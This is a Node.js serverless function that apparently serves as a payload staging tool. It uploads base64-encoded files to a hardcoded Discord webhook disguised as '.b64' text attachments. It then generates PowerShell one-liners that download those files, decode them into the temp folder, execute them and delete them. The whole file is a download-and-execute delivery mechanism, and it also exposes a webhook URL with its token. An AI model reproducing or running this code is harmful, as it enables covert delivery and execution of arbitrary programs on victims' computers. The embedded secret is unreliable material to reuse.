const https = require('https');

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504857329190048006/VKZEEClNQkY75JLhBYc91V5fr8buY5A-O8fgnJFtDVnHVwCc9Fro54FI9ZJrGSpssVh2';

async function uploadToDiscord(base64Content, filename) {
  const encodedName = filename.replace(/\.[^/.]+$/, '') + '.b64';
  const boundary = '----Boundary' + Math.random().toString(36).substring(2);
  
  const payload = Buffer.concat([
    Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${encodedName}"\r\nContent-Type: text/plain\r\n\r\n`),
    Buffer.from(base64Content),
    Buffer.from(`\r\n--${boundary}--\r\n`)
  ]);

  return new Promise((resolve, reject) => {
    const url = new URL(DISCORD_WEBHOOK);
    const req = https.request({
      hostname: url.hostname,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': payload.length
      }
    }, res => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(data);
          if (json.attachments?.[0]?.url) resolve({ url: json.attachments[0].url, name: filename });
          else reject(new Error('Discord API Error'));
        } catch (e) { reject(new Error('Invalid Discord Response')); }
      });
    });
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Use POST' });

  try {
    const { files } = req.body;
    if (!files || !Array.isArray(files) || files.length === 0) {
      return res.status(400).json({ success: false, error: 'No files provided' });
    }

    const results = [];
    for (const file of files) {
      const uploaded = await uploadToDiscord(file.content, file.filename);
      results.push(uploaded);
    }

    let cmd = '';
    if (results.length === 1) {
      cmd = `powershell -c "$t=\\"$env:TEMP\\${results[0].name}\\";$u='${results[0].url}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u)));Start-Process $t -Wait;Remove-Item $t"`;
    } else {
      let varDefs = [], cmdParts = [], startParts = [], tVars = [];
      results.forEach((r, i) => {
        const idx = i + 1;
        varDefs.push(`$t${idx}=\\"$env:TEMP\\${r.name}\\"`, `$u${idx}='${r.url}'`);
        cmdParts.push(`[IO.File]::WriteAllBytes($t${idx},[Convert]::FromBase64String((irm $u${idx})))`);
        startParts.push(`Start-Process $t${idx} -Wait`);
        tVars.push(`$t${idx}`);
      });
      cmd = `powershell -c "${varDefs.join(';')};${cmdParts.join(';')};${startParts.join(';')};Remove-Item ${tVars.join(',')}"`;
    }

    // Сообщение в Discord
    const whReq = https.request(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    });
    whReq.write(JSON.stringify({
      content: `📁 **${results.map(r=>r.name).join(', ')}**\n\`\`\`powershell\n${cmd}\n\`\`\``
    }));
    whReq.end();

    return res.status(200).json({ success: true, command: cmd });

  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
};
